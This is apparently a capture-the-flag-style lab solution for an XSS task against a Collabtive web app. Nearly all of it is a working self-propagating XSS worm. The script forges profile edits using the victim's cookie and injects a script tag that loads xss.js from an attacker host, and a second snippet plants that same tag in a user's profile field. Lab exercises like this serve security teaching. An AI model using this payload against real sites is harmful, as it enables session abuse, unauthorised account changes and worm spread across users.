# XSS solutions

### task 6

Create xss.js file in csrflabattacker root directory.

```javascript
var on=new Ajax.Updater("onlinelist","manageuser.php?action=onlinelist",
    {method:'get',
    onSuccess:function(transport){
        username=transport.responseText.replace(/<\/?[^>]+(>|$)/g, "").trim();
        var ajax=new XMLHttpRequest();
        ajax.open('POST','http://www.xsslabcollabtive.com/manageuser.php?action=edit',true);
        ajax.setRequestHeader('Host','www.xsslabcollabtive.com');
        ajax.setRequestHeader('Keep-Alive','300');
        ajax.setRequestHeader('Connection','keep-alive');
        ajax.setRequestHeader('Cookie',document.cookie);
        ajax.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
        var content='name=' + username + '&company=<script src="http://www.csrflabattacker.com/xss.js"></script>&email=' + username + '.xss@email.com' ;
        ajax.send(content);
    }});
```

add blow line in company field of user alice's profile:
```html
<script src="http://www.csrflabattacker.com/xss.js"></script>
```
